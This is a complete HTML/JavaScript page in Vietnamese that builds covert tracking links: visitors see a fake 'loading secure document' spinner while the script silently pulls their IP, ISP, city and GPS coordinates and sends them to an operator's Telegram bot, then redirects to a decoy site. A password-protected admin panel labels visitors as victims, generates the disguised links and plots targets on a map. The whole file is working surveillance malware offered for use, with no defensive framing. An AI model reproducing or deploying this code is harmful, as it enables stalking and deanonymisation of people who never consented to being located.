<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title id="dyn-title">H·ªá th·ªëng x√°c th·ª±c</title>
    
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
    
    <style>
        .admin-bg { background: #010409; color: #c9d1d9; }
        .glass { background: #0d1117; border: 1px solid #30363d; border-radius: 12px; }
        #map { height: 350px; width: 100%; border-radius: 12px; border: 1px solid #30363d; z-index: 1; }
        .input-dark { background: #010409; border: 1px solid #30363d; color: #f0f6fc; padding: 8px; border-radius: 6px; width: 100%; font-size: 11px; outline: none; }
        .victim-body { background: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; }
        .loader { border: 3px solid #f3f3f3; border-top: 3px solid #3b82f6; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .hidden { display: none; }
    </style>
</head>
<body id="main-body" class="victim-body">

    <div id="ui-victim" class="text-center p-6">
        <div class="loader mb-4 mx-auto"></div>
        <p id="status-msg" class="text-gray-500 text-sm italic">ƒêang t·∫£i t√†i li·ªáu b·∫£o m·∫≠t...</p>
    </div>

    <div id="ui-admin" class="hidden w-full p-4 lg:p-6">
        <div class="max-w-7xl mx-auto space-y-6">
            <header class="flex justify-between items-center border-b border-gray-800 pb-4">
                <h1 class="text-xl font-black text-blue-500 italic uppercase"> 
                    BCA</h1>
                <div class="flex gap-2">
                    <button onclick="getMyLocation()" class="bg-blue-600/20 text-blue-400 px-3 py-1 rounded text-[10px] font-bold border border-blue-500/30">V·ªä TR√ç C·ª¶A T√îI</button>
                    <button onclick="logout()" class="bg-red-900/20 text-red-500 px-3 py-1 rounded text-[10px] font-bold">LOGOUT</button>
                </div>
            </header>

            <div class="grid lg:grid-cols-3 gap-6">
                <div class="space-y-4">
                    <div class="glass p-4 space-y-3 shadow-xl">
                        <h3 class="text-[10px] font-bold text-gray-400 uppercase tracking-widest border-b border-gray-800 pb-2">C·∫•u h√¨nh Bot</h3>
                        <input id="cfg-tk" type="password" placeholder="Bot Token" class="input-dark">
                        <input id="cfg-id" type="text" placeholder="Chat ID" class="input-dark">
                        <input id="cfg-rd" type="text" placeholder="Link ƒë√≠ch" class="input-dark">
                        <input id="in-name" type="text" placeholder="T√™n m·ª•c ti√™u" class="input-dark">
                        <button onclick="saveAndBuild()" class="w-full bg-blue-600 py-2 rounded font-bold text-[11px] uppercase transition hover:bg-blue-500">T·∫°o Link</button>
                        <div id="box-result" class="hidden p-2 bg-black rounded border border-blue-900/30">
                            <div id="out-link" class="text-[9px] text-blue-400 break-all cursor-pointer font-mono" onclick="copyText(this)"></div>
                        </div>
                    </div>
                    <div id="map"></div>
                </div>

                <div class="lg:col-span-2 space-y-4">
                    <div class="glass flex flex-col h-full shadow-2xl overflow-hidden">
                        <div class="p-4 bg-slate-900/50 border-b border-gray-800 font-bold text-xs uppercase text-green-500 tracking-tighter">
                            üì° Nh·∫≠t k√Ω truy c·∫≠p th·ªùi gian th·ª±c
                        </div>
                        <div class="overflow-x-auto">
                            <table class="w-full text-left text-[11px]">
                                <thead class="bg-black text-gray-500 uppercase text-[9px]">
                                    <tr>
                                        <th class="p-3">M·ª•c ti√™u</th>
                                        <th class="p-3">IP / Nh√† m·∫°ng</th>
                                        <th class="p-3">ƒê·ªãa ch·ªâ (Geo)</th>
                                        <th class="p-3 text-right">Thao t√°c</th>
                                    </tr>
                                </thead>
                                <tbody id="log-list" class="divide-y divide-gray-800 text-gray-300">
                                    <tr><td colspan="4" class="p-10 text-center text-gray-700 italic">ƒêang qu√©t t√≠n hi·ªáu...</td></tr>
                                </tbody>
                            </table>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <script>
        let config = { t: '', i: '', r: 'https://google.com' };
        let map, targetMarker, myMarker;
        const urlParams = new URLSearchParams(window.location.search);

        window.onload = () => {
            if (urlParams.has('admin')) {
                document.getElementById('main-body').className = "admin-bg";
                document.getElementById('ui-victim').classList.add('hidden');
                if (localStorage.getItem('v5_auth') === 'true' || prompt("Pass:") === "123") {
                    localStorage.setItem('v5_auth', 'true');
                    document.getElementById('ui-admin').classList.remove('hidden');
                    initAdmin();
                } else { window.location.search = ""; }
            } else { startTracking(); }
        };

        // --- TRACKER LOGIC ---
        async function startTracking() {
            try { 
                const v = urlParams.get('v'); 
                if(v) config = JSON.parse(decodeURIComponent(escape(atob(v)))); 
            } catch(e) {}

            const targetName = urlParams.get('name') || '·∫®n danh';
            
            // 1. L·∫•y IP ng·∫ßm
            try {
                const res = await fetch('https://ipwho.is/').then(r => r.json());
                if(res.success) {
                    const logData = { name: targetName, ip: res.ip, isp: res.connection.isp, address: `${res.city}, ${res.country}`, time: new Date().toLocaleTimeString(), st: 'IP', lat: res.latitude, lon: res.longitude };
                    saveLog(logData);
                    await sendTele(`üöÄ <b>${targetName}</b> v·ª´a v√†o link\nüåê IP: ${res.ip}\nüè¢ ISP: ${res.connection.isp}\nüìç ${res.city}`);
                }
            } catch(e) {}

            // 2. L·∫•y GPS (√âp quy·ªÅn)
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(async (p) => {
                    const lat = p.coords.latitude, lon = p.coords.longitude;
                    await sendTele(`üéØ <b>${targetName} (GPS OK)</b>\nüìç T·ªça ƒë·ªô: ${lat}, ${lon}\nüó∫Ô∏è Map: https://www.google.com/maps?q=${lat},${lon}`);
                    window.location.replace(config.r);
                }, () => window.location.replace(config.r), { timeout: 8000 });
            } else { window.location.replace(config.r); }
        }

        // --- ADMIN LOGIC ---
        function initAdmin() {
            map = L.map('map').setView([15.8, 108.2], 5);
            L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);
            
            const saved = localStorage.getItem('v5_cfg');
            if(saved) {
                config = JSON.parse(saved);
                document.getElementById('cfg-tk').value = config.t;
                document.getElementById('cfg-id').value = config.i;
                document.getElementById('cfg-rd').value = config.r;
            }
            renderLogs();
            setInterval(renderLogs, 3000); // T·ª± ƒë·ªông c·∫≠p nh·∫≠t b·∫£ng nh·∫≠t k√Ω
        }

        function getMyLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition((p) => {
                    const lat = p.coords.latitude, lon = p.coords.longitude;
                    if (myMarker) map.removeLayer(myMarker);
                    myMarker = L.circleMarker([lat, lon], { color: '#3b82f6', radius: 8 }).addTo(map);
                    myMarker.bindPopup("V·ªã tr√≠ c·ªßa t√¥i (Admin)").openPopup();
                    map.flyTo([lat, lon], 14);
                });
            }
        }

        function renderLogs() {
            const logs = JSON.parse(localStorage.getItem('v38_logs') || '[]');
            const list = document.getElementById('log-list');
            if (logs.length === 0) return;
            
            list.innerHTML = logs.map(l => `
                <tr class="hover:bg-white/5 border-b border-gray-800">
                    <td class="p-3"><b>${l.name}</b><br><span class="text-[8px] text-gray-600">${l.time}</span></td>
                    <td class="p-3 font-mono text-blue-400 text-[10px]">${l.ip}<br><span class="text-[8px] text-gray-600 uppercase">${l.isp}</span></td>
                    <td class="p-3 text-[10px] text-gray-400 max-w-[150px] truncate">${l.address}</td>
                    <td class="p-3 text-right">
                        <button onclick="viewTarget(${l.lat}, ${l.lon})" class="bg-blue-600/20 text-blue-400 px-2 py-1 rounded text-[8px] font-bold">XEM MAP</button>
                    </td>
                </tr>
            `).join('');
        }

        function viewTarget(lat, lon) {
            if (targetMarker) map.removeLayer(targetMarker);
            targetMarker = L.marker([lat, lon]).addTo(map);
            map.flyTo([lat, lon], 15);
        }

        function saveLog(data) {
            let logs = JSON.parse(localStorage.getItem('v38_logs') || '[]');
            logs.unshift(data);
            localStorage.setItem('v38_logs', JSON.stringify(logs.slice(0, 50)));
        }

        async function sendTele(msg) {
            if(!config.t || !config.i) return;
            try { fetch(`https://api.telegram.org/bot${config.t}/sendMessage?chat_id=${config.i}&parse_mode=HTML&text=${encodeURIComponent(msg)}`); } catch(e) {}
        }

        function saveAndBuild() {
            config = { t: document.getElementById('cfg-tk').value, i: document.getElementById('cfg-id').value, r: document.getElementById('cfg-rd').value };
            localStorage.setItem('v5_cfg', JSON.stringify(config));
            const v = btoa(unescape(encodeURIComponent(JSON.stringify(config))));
            const link = window.location.origin + window.location.pathname + "?name=" + encodeURIComponent(document.getElementById('in-name').value) + "&v=" + v;
            document.getElementById('box-result').classList.remove('hidden');
            document.getElementById('out-link').innerText = link;
        }

        function copyText(el) { navigator.clipboard.writeText(el.innerText); alert("ƒê√£ copy link!"); }
        function logout() { localStorage.removeItem('v5_auth'); location.reload(); }
    </script>
</body>
</html>
